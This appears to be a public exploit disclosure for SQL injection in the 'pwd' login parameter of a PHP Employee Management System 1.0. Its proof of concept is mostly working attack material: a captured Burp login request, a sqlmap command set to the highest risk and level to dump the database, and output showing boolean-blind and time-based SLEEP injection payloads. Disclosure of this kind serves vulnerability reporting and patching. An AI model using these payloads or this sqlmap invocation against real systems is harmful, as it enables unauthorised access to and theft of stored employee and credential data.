# Employee Managment System - SQL Injection - 2
+ **Exploit Title:** Employee Managment System - SQL Injection - 2
+ **Date:** 2024-30-01
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/employee-management-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/4af079c9-ab82-4b2a-a133-be6989c7f70e
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Employee Managment System 1.0 allows SQL Injection via the 'pwd' parameter at "http://localhost/370project/process/aprocess.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/370project//alogin.html"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /370project/process/aprocess.php HTTP/1.1
Host: localhost
Content-Length: 42
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/370project/alogin.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

mailuid=selam&pwd=selam&login-submit=Login

```

+ Use sqlmap to exploit. In sqlmap, use 'pwd' parameter to dump the database.
```
sqlmap -r r.txt -p pwd --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: pwd (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: mailuid=selam&pwd=selam' OR NOT 4950=4950-- pTpv&login-submit=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: mailuid=selam&pwd=selam' AND (SELECT 7809 FROM (SELECT(SLEEP(5)))YTrZ)-- CFoo&login-submit=Login
---
[05:01:17] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[05:01:17] [INFO] fetching current database
[05:01:17] [INFO] resumed: 370project
current database: '370project'


```
+ current database: `370project`

![Ekran görüntüsü 2024-01-30 133436](https://github.com/BurakSevben/CVEs/assets/117217689/46c520f9-8844-4f7d-aa97-c9b189e2a9cf)
